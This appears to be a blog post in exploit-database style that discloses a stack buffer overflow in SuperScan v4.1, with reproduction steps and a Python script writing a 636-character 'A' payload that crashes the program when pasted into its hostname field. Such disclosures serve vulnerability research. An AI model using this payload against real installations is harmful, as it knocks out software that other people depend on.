---
layout: post
title: SuperScan v4.1 - Stack Buffer Overflow (PoC)
date: 2023-09-18
category: exploit
---

# Exploit Title: SuperScan v4.1 - Stack Buffer Overflow (PoC)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 18.09.2023
# Vendor: Foundstone Inc
# Software Link: https://delivery2.filecroco.com/kits_6/superscan-4.1.zip
# Tested Version: v4.1 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open the SuperScan application.
2. Paste the content of `poc.txt` into the **Hostname / IP** box.
3. Click the arrow button next to the box.
4. The application crashes due to a buffer overflow.

### Proof of Concept (PoC)

The following Python script generates a `poc.txt` file containing the payload. When loaded into the **Hostname / IP** field, it triggers a buffer overflow and crashes the application.

```python
#!/usr/bin/python

poc = 'A' * 636

try:
    with open("poc.txt", "w") as file:
        file.write(poc)
    print("POC is created")
except Exception as e:
    print("POC is not created:", e)
